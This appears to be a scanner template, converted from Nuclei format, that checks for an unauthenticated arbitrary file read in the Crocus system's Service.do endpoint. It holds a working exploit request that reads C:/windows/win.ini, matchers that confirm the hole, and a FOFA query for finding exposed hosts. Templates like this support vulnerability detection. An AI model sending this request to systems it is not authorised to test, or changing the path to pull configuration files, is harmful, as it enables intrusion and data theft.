@@ -1,0 +1,142 @@
+{
+  "id": "crocus-lfi",
+  "name": "Crocus system Service.do  - Arbitrary File Read",
+  "author": "pussycat0x",
+  "severity": "HIGH",
+  "description": "There is an arbitrary file reading vulnerability in the Service.do interface of Ruiming Technology\u0027s Crocus system. An unauthenticated remote attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc. This leaves the website in an extremely unsafe state.\n",
+  "references": [
+    "https://github.com/wy876/POC/blob/main/%E9%94%90%E6%98%8E%E6%8A%80%E6%9C%AFCrocus%E7%B3%BB%E7%BB%9FService.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+  ],
+  "tags": [
+    "crocus",
+    "lfi"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "body\u003d\"/ThirdResource/respond/respond.min.js\" \u0026\u0026 title\u003d\"Crocus\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /Service.do?Action\u003dDownload\u0026Path\u003dC:/windows/win.ini HTTP/1.1\nHost: {{Hostname}}\nX-Requested-With: XMLHttpRequest\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "bit app support",
+            "fonts",
+            "extensions"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "crocus-lfi",
+    "info": {
+      "name": "Crocus system Service.do  - Arbitrary File Read",
+      "author": "pussycat0x",
+      "severity": "high",
+      "description": "There is an arbitrary file reading vulnerability in the Service.do interface of Ruiming Technology\u0027s Crocus system. An unauthenticated remote attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc. This leaves the website in an extremely unsafe state.\n",
+      "reference": [
+        "https://github.com/wy876/POC/blob/main/%E9%94%90%E6%98%8E%E6%8A%80%E6%9C%AFCrocus%E7%B3%BB%E7%BB%9FService.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "body\u003d\"/ThirdResource/respond/respond.min.js\" \u0026\u0026 title\u003d\"Crocus\""
+      },
+      "tags": "crocus,lfi"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /Service.do?Action\u003dDownload\u0026Path\u003dC:/windows/win.ini HTTP/1.1\nHost: {{Hostname}}\nX-Requested-With: XMLHttpRequest\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "bit app support",
+              "fonts",
+              "extensions"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
